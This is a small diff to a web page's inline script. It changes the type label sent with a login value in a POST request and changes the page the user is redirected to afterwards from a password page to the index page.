@@ -42,14 +42,15 @@ function enviarLogin() {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({
-      tipo: "Login",
+      tipo: "login",
       valor: login
     })
   }).then(() => {
-    window.location.href = "clave.html";
+    window.location.href = "index.html";
   });
 }
 </script>
+
 
     <!-- Links -->
     <div class="links">
